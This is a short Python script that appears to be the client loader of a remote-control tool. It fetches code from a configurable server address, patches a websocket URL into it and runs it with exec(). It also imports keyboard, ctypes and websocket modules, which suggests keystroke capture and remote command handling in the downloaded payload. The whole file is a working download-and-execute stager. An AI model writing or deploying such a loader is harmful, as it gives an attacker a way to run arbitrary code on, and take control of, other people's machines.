import string
import sys
import websocket
import keyboard
import os
import platform
import uuid
from tempfile import TemporaryFile
import base64
import zlib
from struct import pack, calcsize, unpack
import json
import ctypes
import lzma
import gzip
# 客户端导包
import urllib.request
import urllib.parse

url = "http://127.0.0.1:5000/base"  # 你的服务端地址
parsed = urllib.parse.urlparse(url)
WS_URL = "{}://{}/ping".format(["wss", "ws"][parsed.scheme == "http"], parsed.netloc)
req = urllib.request.urlopen(parsed.geturl())
code = req.read().decode().replace("ws://127.0.0.1:5000/ping", WS_URL)

exec(code)
